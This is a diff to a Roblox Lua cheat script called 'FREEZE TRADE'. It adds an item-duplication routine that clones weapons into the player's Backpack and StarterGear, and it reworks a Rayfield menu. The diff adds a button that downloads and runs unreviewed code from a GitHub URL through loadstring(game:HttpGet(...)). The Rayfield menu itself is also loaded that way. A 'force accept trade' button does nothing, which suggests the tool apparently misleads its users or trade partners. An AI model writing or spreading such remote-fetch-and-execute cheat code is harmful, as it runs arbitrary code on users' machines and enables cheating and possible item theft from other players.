@@ -7,6 +7,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
+local PlayerGui = player.PlayerGui
+local Backpack = player.Backpack
+local StarterGear = player.StarterGear
 local GameID = game.PlaceId
 local PlayerName = player.Name
 local PlayerID = player.UserId
@@ -50,14 +53,14 @@ MainBG.BackgroundColor3 = Theme.BG
 MainBG.Parent = Loader
 
 local Center = Instance.new("Frame")
-Center.Size = UDim2.new(0,550,0,350)
-Center.Position = UDim2.new(0.5,-275,0.5,-175)
+Center.Size = UDim2.new(0,340,0,520)
+Center.Position = UDim2.new(0.5,-170,0.5,-260)
 Center.BackgroundTransparency = 1
 Center.Parent = MainBG
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1,0,0,70)
-Title.Position = UDim2.new(0,0,0,10)
+Title.Size = UDim2.new(1,0,0,60)
+Title.Position = UDim2.new(0,0,0,20)
 Title.BackgroundTransparency = 1
 Title.Text = "FREEZE TRADE"
 Title.TextColor3 = Theme.Text
@@ -66,8 +69,8 @@ Title.Font = Enum.Font.GothamBlack
 Title.Parent = Center
 
 local BarOutline = Instance.new("Frame")
-BarOutline.Size = UDim2.new(0,450,0,22)
-BarOutline.Position = UDim2.new(0.5,-225,0.5,0)
+BarOutline.Size = UDim2.new(0,280,0,18)
+BarOutline.Position = UDim2.new(0.5,-140,0.22,0)
 BarOutline.BackgroundColor3 = Theme.Panel
 BarOutline.Parent = Center
 Instance.new("UICorner", BarOutline).CornerRadius = UDim.new(1,0)
@@ -121,24 +124,54 @@ local function DisableHitbox()
 end
 
 local function DupeItem(name)
-    local Item = ReplicatedStorage:FindFirstChild(name) or Workspace:FindFirstChild(name, true)
-    if Item and (Item:IsA("Tool") or Item:IsA("Accessory")) then
-        Item:Clone().Parent = player.Backpack
-        if player.StarterGear then Item:Clone().Parent = player.StarterGear end
-        return true
+    local success = false
+    local source = nil
+    local locations = {ReplicatedStorage, Workspace, player.Character, Backpack}
+    for _, loc in pairs(locations) do
+        if loc then
+            local found = loc:FindFirstChild(name, true)
+            if found and (found:IsA("Tool") or found:IsA("Accessory")) then
+                source = found
+                break
+            end
+        end
     end
-    return false
+    if source then
+        local clone1 = source:Clone()
+        clone1.Parent = Backpack
+        task.wait(0.1)
+        if StarterGear then
+            local clone2 = source:Clone()
+            clone2.Parent = StarterGear
+        end
+        success = true
+    end
+    return success
 end
 
 function LoadGUI()
     local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-    local Window = Rayfield:CreateWindow({Name="FREEZE TRADE", KeySystem=false, ConfigurationSaving={Enabled=false}})
+    local Window = Rayfield:CreateWindow({
+        Name = "FREEZE TRADE",
+        KeySystem = false,
+        ConfigurationSaving = {Enabled = false},
+        UseMobileSizing = true
+    })
 
     local Main = Window:CreateTab("Main", 4483362458)
     local Weapons = Window:CreateTab("Weapons", 4483362458)
     local Tools = Window:CreateTab("Tools", 4483362458)
 
     Main:CreateSection("FEATURES")
+    Main:CreateButton({
+        Name = "🧊 activate freeze trade",
+        Callback = function()
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/baddiesfreeze-glitch/freeze-trade/refs/heads/main/Baddies", true))()
+            end)
+            Rayfield:Notify({Title="✅ ACTIVATED",Content="Freeze trade loaded",Duration=2.5})
+        end
+    })
     Main:CreateButton({Name = "force accept trade", Callback = function() end})
 
     Weapons:CreateSection("ALL WEAPONS")
@@ -193,7 +226,14 @@ function LoadGUI()
     for _,wep in pairs(WeaponList) do
         Weapons:CreateButton({
             Name = wep,
-            Callback = function() DupeItem(wep) end
+            Callback = function()
+                local ok = DupeItem(wep)
+                Rayfield:Notify({
+                    Title = ok and "✅ DUPLICATED!" or "❌ NOT FOUND",
+                    Content = ok and wep.." added" or "weapon not loaded",
+                    Duration = 2.5
+                })
+            end
         })
     end
 
